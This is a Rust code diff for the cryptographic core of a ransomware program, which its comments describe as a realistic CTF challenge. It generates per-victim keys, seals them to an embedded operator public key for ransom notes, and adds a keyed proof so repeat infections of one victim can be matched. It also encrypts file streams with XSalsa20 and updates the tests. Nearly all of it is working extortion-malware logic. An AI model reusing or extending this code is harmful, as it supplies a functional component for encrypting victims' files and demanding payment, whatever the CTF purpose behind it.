@@ -1,17 +1,18 @@
 use std::io::Read;
 
 use bs58;
-use dryoc::auth::Auth;
 use dryoc::dryocbox;
 use dryoc::dryocbox::DryocBox;
+use dryoc::generichash;
+use dryoc::generichash::GenericHash;
 use dryoc::kdf;
+use dryoc::kdf::Kdf;
 use dryoc::onetimeauth;
 use dryoc::onetimeauth::OnetimeAuth;
 use dryoc::types::MutByteArray;
 use dryoc::types::{ByteArray, NewByteArray};
 use salsa20::cipher::{KeyIvInit, StreamCipher};
 use salsa20::XSalsa20;
-use sha2::{Digest, Sha256};
 use uuid::Uuid;
 use zeroize::Zeroize;
 use zeroize::Zeroizing;
@@ -23,6 +24,8 @@ static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operat
 pub struct PerVictimKey {
     victim_id: Uuid,
     keypair: dryocbox::KeyPair,
+    identity_proof: [u8; 16],
+    sealed: Vec<u8>,
 }
 
 impl std::ops::Deref for PerVictimKey {
@@ -34,15 +37,27 @@ impl std::ops::Deref for PerVictimKey {
 
 impl PerVictimKey {
     fn new(victim_id: &Uuid, secret_key: dryocbox::SecretKey) -> Self {
+        // Compute a HMAC with KDF(secret_key, 1) as secret and the victim ID as message.
+        // In case the same ransomware is dropped on a machine multiple times, the operator
+        // should not demand for multiple payments. However with the current architecture we
+        // would generate different secret keys for different runs.
+        // The proof could be used to verify that multiple secret keys belong to the same victim.
+        // This likely does not matter at all: we are authoring a CTF, not a real ransomware,
+        // but we want to make it as realistic as possible.
+        let kdf = Kdf::from_parts(secret_key.clone(), kdf::Context::default());
+        let auth_key: generichash::Key = kdf.derive_subkey(1).unwrap();
+        let seal_seed: dryocbox::SecretKey = kdf.derive_subkey(2).unwrap();
         Self {
             victim_id: victim_id.clone(),
+            sealed: Self::seal(&secret_key, &seal_seed),
             keypair: dryocbox::KeyPair::from_secret_key(secret_key),
+            identity_proof: GenericHash::hash(victim_id.as_bytes(), Some(&auth_key)).unwrap(),
         }
     }
     pub fn generate(victim_id: &Uuid) -> Self {
         Self::new(&victim_id, dryocbox::SecretKey::gen())
     }
-    pub fn dump(self: &Self) -> Zeroizing<Vec<u8>> {
+    pub fn dump(&self) -> Zeroizing<Vec<u8>> {
         // Note: with_capacity is important! Otherwise we may fail to zeroize all copies of the key.
         let mut ret: Zeroizing<Vec<u8>> =
             Vec::with_capacity(self.victim_id.as_bytes().len() + self.secret_key.len()).into();
@@ -58,43 +73,30 @@ impl PerVictimKey {
         let secret_key = data[16..48].try_into().ok()?;
         Some(Self::new(&Uuid::from_bytes(victim_id), secret_key))
     }
-    /// For use in ransom notes.
-    pub fn seal_for_operator(&self) -> String {
-        // Compute a HMAC with the encryption key as secret and the victim ID as message.
-        // In case the same ransomware is dropped on a machine multiple times, the operator
-        // should not demand for multiple payments. However with the current architecture we
-        // would generate different secret keys for different runs.
-        // The proof could be used to verify that multiple secret keys belong to the same victim.
-        // This likely does not matter at all: we are authoring a CTF, not a real ransomware,
-        // but we want to make it as realistic as possible.
-        let identity_proof =
-            Auth::compute_to_vec(self.secret_key.clone(), &self.victim_id.as_bytes());
-        let kdf = kdf::Kdf::from_parts(self.secret_key.clone(), kdf::Context::default());
-        let mut ekp_seed: [u8; 32] = kdf.derive_subkey(2).unwrap();
-        let ephemeral_key = dryocbox::KeyPair::from_seed(&ekp_seed);
-        let mut nonce = dryocbox::Nonce::new_byte_array();
-        crypto_box_seal_nonce(
-            &mut nonce,
-            &ephemeral_key.public_key,
-            &OPERATOR_PUBLIC_KEY.into(),
-        );
-        let mut sealed = ephemeral_key.public_key.to_vec();
+    fn seal(secret_key: &dryocbox::SecretKey, ephemeral_seed: &dryocbox::SecretKey) -> Vec<u8> {
+        let ekp = dryocbox::KeyPair::from_seed(ephemeral_seed);
+        let mut nonce = dryocbox::Nonce::new();
+        crypto_box_seal_nonce(&mut nonce, &ekp.public_key, &OPERATOR_PUBLIC_KEY.into());
+        let mut sealed = ekp.public_key.to_vec();
         sealed.append(
             &mut DryocBox::encrypt_to_vecbox(
-                &self.secret_key,
+                secret_key,
                 &nonce,
                 &OPERATOR_PUBLIC_KEY.into(),
-                &ephemeral_key.secret_key,
+                &ekp.secret_key,
             )
             .unwrap()
             .to_vec(),
         );
-        ekp_seed.zeroize();
+        sealed
+    }
+    /// For use in ransom notes.
+    pub fn format_for_operator(&self) -> String {
         format!(
             "{}:{}:{}",
             self.victim_id,
-            bs58::encode(&identity_proof).into_string(),
-            bs58::encode(&sealed).into_string()
+            bs58::encode(&self.identity_proof).into_string(),
+            bs58::encode(&self.sealed).into_string()
         )
     }
 }
@@ -114,7 +116,7 @@ fn crypto_box_seal_nonce(
 }
 
 pub struct EncryptedStreamHeader {
-    sk_sha256: [u8; 32],
+    keyid: [u8; 16],
     epk: dryocbox::PublicKey,
     tag: [u8; 16],
 }
@@ -122,7 +124,7 @@ pub struct EncryptedStreamHeader {
 impl EncryptedStreamHeader {
     pub fn to_vec(self: &Self) -> Vec<u8> {
         let mut v = Vec::new();
-        v.extend_from_slice(&self.sk_sha256);
+        v.extend_from_slice(&self.keyid);
         v.extend_from_slice(self.epk.as_array());
         v.extend_from_slice(&self.tag);
         v
@@ -137,7 +139,7 @@ pub fn encrypt_stream(
     // This is basically hand-rolled dryoc::dryocbox::Box, but works on stream.
     let ephemeral_key = dryocbox::KeyPair::gen();
     let mut header = EncryptedStreamHeader {
-        sk_sha256: Sha256::digest(&key.secret_key.as_array()).into(),
+        keyid: key.identity_proof,
         epk: ephemeral_key.public_key.clone(),
         tag: [0; 16],
     };
@@ -169,17 +171,25 @@ pub fn encrypt_stream(
 }
 
 #[cfg(test)]
+#[derive(Debug, thiserror::Error)]
+pub enum DecryptError {
+    #[error("wrong secret key")]
+    WrongSecretKey,
+    #[error("io error: {0}")]
+    IoError(#[from] std::io::Error),
+    #[error("invalid tag: {0}")]
+    InvalidTag(#[from] dryoc::Error),
+}
+
+#[cfg(test)]
 fn decrypt_stream(
     key: &PerVictimKey,
     header: &EncryptedStreamHeader,
     input: &mut impl std::io::Read,
     output: &mut impl std::io::Write,
-) -> std::io::Result<()> {
-    if Sha256::digest(key.secret_key.as_array()) != header.sk_sha256.into() {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::InvalidData,
-            "Wrong secret key",
-        ));
+) -> Result<(), DecryptError> {
+    if header.keyid != key.identity_proof {
+        return Err(DecryptError::WrongSecretKey);
     }
     let mut shared_key = dryoc::classic::crypto_box::crypto_box_beforenm(
         header.epk.as_array(),
@@ -203,8 +213,7 @@ fn decrypt_stream(
         cipher.apply_keystream(&mut buf);
         output.write_all(&buf)?;
     }
-    hash.verify(&header.tag)
-        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "Invalid tag"))?;
+    hash.verify(&header.tag)?;
     Ok(())
 }
 
@@ -219,8 +228,8 @@ mod tests {
             [0; 32].into(),
         );
         assert_eq!(
-            key.seal_for_operator(),
-            "01234567-89ab-cdef-0123-456789abcdef:6M1m2bucY4682YNiteZ3mCfkMhzmS1ygec8DV2nLtdrS:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5AAsvzw4VusXTHgJBTRbmQDNFKBk5NgfKbXdsRgsNhu1eCHUbrgYuTqAjyogdrnmPXvA"
+            key.format_for_operator(),
+            "01234567-89ab-cdef-0123-456789abcdef:9KJQTYXEkPTthfYP29gSTd:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5AAsvzw4VusXTHgJBTRbmQDNFKBk5NgfKbXdsRgsNhu1eCHUbrgYuTqAjyogdrnmPXvA"
         );
     }
     #[test]
